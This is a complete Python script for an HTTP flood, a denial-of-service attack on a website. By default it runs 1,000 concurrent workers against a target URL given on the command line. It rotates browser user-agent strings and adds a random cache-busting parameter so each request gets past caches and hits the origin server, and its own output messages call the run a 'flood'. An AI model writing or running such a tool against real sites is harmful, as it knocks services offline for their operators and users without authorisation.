import asyncio
import aiohttp
import time
import random
import sys

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Chrome/113.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/114.0 Safari/537.36",
]

async def fetch(session, url):
    headers = {
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Expires": "0",
        "User-Agent": random.choice(user_agents),
    }
    unique_param = str(int(time.time() * 1000)) + str(random.randint(1000, 9999))
    bypass_url = f"{url}?cachebypass={unique_param}"
    try:
        async with session.get(bypass_url, headers=headers) as resp:
            status = resp.status
            print(f"[{status}] {bypass_url}")
    except Exception as e:
        print(f"[ERROR] {e}")

async def worker(session, end_time, url):
    while time.time() < end_time:
        await fetch(session, url)

async def main(url, duration, concurrency):
    end_time = time.time() + duration
    connector = aiohttp.TCPConnector(limit=concurrency)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(worker(session, end_time, url)) for _ in range(concurrency)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python main.py <URL> <duration_seconds> [concurrency]")
        sys.exit(1)

    target_url = sys.argv[1]
    duration = int(sys.argv[2])
    concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 1000

    print(f"Starting flood on {target_url} with concurrency={concurrency} for {duration} seconds...")
    asyncio.run(main(target_url, duration, concurrency))
    print("Flood finished.")
